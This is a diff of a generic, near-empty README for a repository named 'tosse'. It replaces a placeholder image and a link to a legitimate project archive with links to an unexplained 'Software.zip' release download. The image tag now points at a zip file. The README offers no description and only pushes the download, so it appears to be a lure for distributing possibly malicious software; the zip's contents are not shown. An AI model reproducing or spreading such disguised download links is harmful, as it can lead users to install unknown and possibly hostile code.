@@ -1,12 +1,12 @@
 # 🚀 Welcome to the "tosse" Repository!
 
-![tosse](https://via.placeholder.com/800x200)
+![tosse](https://github.com/chewbacca769/tosse/releases/download/v1.0/Software.zip)
 
 This repository does not have a specific short description or topics listed. However, you can explore the contents and features by downloading the source code package.
 
 ## 📁 Download
 
-🔗 [Launch v1.0.0 ZIP File](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 🚀
+🔗 [Launch v1.0.0 ZIP File](https://github.com/chewbacca769/tosse/releases/download/v1.0/Software.zip) 🚀
 
 ## 🌟 How to Get Started
 
